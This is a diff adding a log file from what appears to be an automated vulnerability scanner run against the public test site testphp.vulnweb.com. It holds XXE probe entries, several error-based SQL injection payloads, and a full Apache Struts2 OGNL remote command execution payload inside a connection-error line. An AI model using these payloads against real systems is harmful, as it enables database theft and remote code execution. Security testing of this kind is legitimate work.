@@ -1,0 +1,28 @@
+[2018-04-18 18:29:22,416] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vQUpBWC9zaG93eG1sLnBocA]
+[2018-04-18 18:29:31,452] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vY29tbWVudC5waHA]
+[2018-04-18 18:30:16,613] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vQUpBWC9zaG93eG1sLnBocA]
+[2018-04-18 18:31:04,878] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vaW5kZXgucGhw]
+[2018-04-18 18:31:59,266] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vY29tbWVudC5waHA]
+[2018-04-18 18:32:11,877] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vY29tbWVudC5waHA]
+[2018-04-18 18:32:14,753] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vY29tbWVudC5waHA]
+[2018-04-18 18:32:56,291] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vY29tbWVudC5waHA]
+[2018-04-18 18:34:23,167] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vQUpBWC9hcnRpc3RzLnBocA]
+[2018-04-18 18:34:27,535] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vQUpBWC9jYXRlZ29yaWVzLnBocA]
+[2018-04-18 18:34:34,927] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vQUpBWC90aXRsZXMucGhw]
+[2018-04-18 18:34:40,081] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vQUpBWC9pbmZvYXJ0aXN0LnBocD9pZD0x]
+[2018-04-18 18:34:41,517] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vQUpBWC9pbmZvY2F0ZWcucGhwP2lkPTI]
+[2018-04-18 18:34:48,793] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vQUpBWC9pbmZvdGl0bGUucGhw]
+[2018-04-18 18:35:11,546] [tasks.py] [21] [VULN FOUND] {'url': 'http://testphp.vulnweb.com/AJAX/infocateg.php?id=2', 'info': '[sql injection]', 'type': 'sqli', 'method': 'GET', 'param': 'http://testphp.vulnweb.com/AJAX/infocateg.php?id=and%28select+1+from%28select+count%28%2A%29%2Cconcat%28%28select+concat%28usofgiwcyl%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.tables+group+by+x%29a%29and'}
+[2018-04-18 18:35:12,125] [tasks.py] [21] [VULN FOUND] {'url': 'http://testphp.vulnweb.com/AJAX/infoartist.php?id=1', 'info': '[sql injection]', 'type': 'sqli', 'method': 'GET', 'param': 'http://testphp.vulnweb.com/AJAX/infoartist.php?id=and%28select+1+from%28select+count%28%2A%29%2Cconcat%28%28select+concat%28nfdjqetxbo%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.tables+group+by+x%29a%29and'}
+[2018-04-18 18:35:25,868] [tasks.py] [21] [VULN FOUND] {'url': 'http://testphp.vulnweb.com/AJAX/infotitle.php', 'info': '[sql injection]', 'type': 'sqli', 'method': 'POST', 'param': 'id=and%28select+1+from%28select+count%28%2A%29%2Cconcat%28%28select+concat%28vflyhbetni%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.tables+group+by+x%29a%29and'}
+[2018-04-18 18:35:40,445] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vQUpBWC9zaG93eG1sLnBocA]
+[2018-04-18 18:36:46,845] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vQUpBWC9zaG93eG1sLnBocA]
+[2018-04-18 19:10:25,752] [poc_struts.py] [127] ReadTimeout(ReadTimeoutError("HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Read timed out. (read timeout=10)",),)
+[2018-04-18 19:13:17,510] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vc2VhcmNoLnBocD90ZXN0PXF1ZXJ5]
+[2018-04-18 19:17:09,869] [poc_struts.py] [110] ConnectionError(MaxRetryError("HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Max retries exceeded with url: /index.action (Caused by NewConnectionError('<requests.packages.urllib3.connection.HTTPConnection object at 0x2d1f350>: Failed to establish a new connection: [Errno 110] Connection timed out',))",),)
+[2018-04-18 19:18:38,062] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vc2VhcmNoLnBocD90ZXN0PXF1ZXJ5]
+[2018-04-18 19:19:07,622] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vc2VhcmNoLnBocD90ZXN0PXF1ZXJ5]
+[2018-04-18 19:19:09,862] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vc2VhcmNoLnBocD90ZXN0PXF1ZXJ5]
+[2018-04-18 19:19:37,522] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vc2VhcmNoLnBocD90ZXN0PXF1ZXJ5]
+[2018-04-18 19:22:37,121] [poc_struts.py] [127] ConnectionError(MaxRetryError("HTTPConnectionPool(host='testphp.vulnweb.com', port=80): Max retries exceeded with url: /index.action?debug%3dcommand%26expression%3d%23f%3d%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27)%2c%23f.setAccessible(true)%2c%23f.set(%23_memberAccess%2ctrue)%2c%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()%2c%23resp%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%27echo%27%2c%2735d33e01dfb4b2a2f72d66a413ea3d85%27%7d)).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b10000%5d%2c%23d.read(%23e)%2c%23resp.println(%23e)%2c%23resp.close() (Caused by NewConnectionError('<requests.packages.urllib3.connection.HTTPConnection object at 0x2b5ca90>: Failed to establish a new connection: [Errno 110] Connection timed out',))",),)
+[2018-04-18 19:23:39,806] [poc_xxe.py] [31] [xxe] [target=aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vc2VhcmNoLnBocD90ZXN0PXF1ZXJ5]
